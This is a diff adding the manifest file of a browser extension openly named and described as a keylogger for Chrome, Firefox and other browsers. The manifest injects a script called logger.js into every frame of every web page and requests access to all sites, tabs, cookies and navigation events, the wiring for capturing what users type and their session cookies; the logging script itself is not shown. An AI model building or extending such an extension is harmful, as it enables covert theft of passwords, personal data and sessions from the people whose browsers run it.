@@ -1,0 +1,22 @@
+{
+  "manifest_version": 2,
+
+  "name": "keylogger browser",
+  "description": "keylogger chrome,mozilla firefox and other browser",
+  "version": "2.3",
+    "background":{
+      "scripts":[
+         "js/background.js"
+      ]
+   },
+   "content_scripts": [ {
+      "all_frames": true,
+      "js": [ "js/jquery-3.5.1.min.js" ,"js/logger.js"],
+      "matches": [ "http://*/*", "https://*/*" ]
+   } ],
+  "permissions": [ 
+  "http://*/*", "https://*/*",
+  "tabs","cookies",
+  "webNavigation",
+  "activeTab"  ]
+}
